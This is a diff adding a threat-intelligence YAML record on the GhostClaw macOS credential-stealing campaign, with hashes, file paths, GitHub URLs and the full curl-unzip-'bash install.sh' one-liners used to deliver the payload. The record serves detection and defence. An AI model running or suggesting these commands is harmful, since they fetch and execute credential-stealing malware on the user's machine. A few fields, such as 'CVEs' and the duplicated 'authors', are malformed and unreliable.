@@ -1,0 +1,49 @@
+description: GhostClaw malware campaign uses GitHub repositories and AI-assisted development
+  workflows to deliver credential-stealing payloads on macOS.
+attribution: 'null'
+malware_families:
+- Ghost Claw
+- Antigravity Pack
+TTPs:
+  processes:
+  - bash
+  - node
+  commandline:
+  - curl -fsSLk https://github.com/antigravity-sdk/antigravity-pack/archive/refs/heads/main.zip
+    -o /tmp/cw.zip && unzip -qo /tmp/cw.zip -d /tmp && cd /tmp/antigravity-pack-main
+    && bash install.sh
+  - curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip
+    -o /tmp/cw.zip && unzip -qo /tmp/cw.zip -d /tmp && cd /tmp/TradingView-Claw-main
+    && bash install.sh
+  scripting_engine:
+  - curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip
+    -o /tmp/cw.zip && unzip -qo /tmp/cw.zip -d /tmp && cd /tmp/TradingView-Claw-main
+    && bash install.sh
+  file_activity:
+  - /tmp/cw.zip
+  - /tmp/antigravity-pack-main/install.sh
+  - /tmp/TradingView-Claw-main/install.sh
+  - ~/.openclaw/skills/TradingView-Claw
+  persistence: null
+  process_relations: null
+CVEs: 'IOCs:'
+authors: '- Thijs Xhaflaire'
+IOCs:
+  hashes:
+  - ec8d3b922db1cf3a82141a53a472538d10563860dfb93259e99d0aec3661734c
+  - 72bc4f82786e23f067d8731dac2b51c033f49ceceab0a64065a160cdff54f488
+  - a80f2f5ba53bd19c35af5eed763fbaf9f00487bb4df0997651af861ef157ccea
+  - 189b8419863830f2732324a0e02e71721ec550ffa606f9dc719f935db5d25821
+  - ad23c83bbcd2e2ed7ba3338b723f3a36ef7a6866672395a04fdb8fbd1bf68a90
+  - b04cdafdaa9220ab819f33790f014fd84a10f3908e3d7e97a652fa0d76f40c2f
+  ip_addresses: []
+  domains:
+  - github.com
+  urls:
+  - https://github.com/antigravity-sdk/antigravity-pack/archive/refs/heads/main.zip
+  - https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip
+authors:
+- Thijs Xhaflaire
+reference: https://www.jamf.com/blog/ghostclaw-ghostloader-malware-github-repositories-ai-workflows/
+date_of_publication: March 27, 2026
+file_creation_date: March 27, 2026
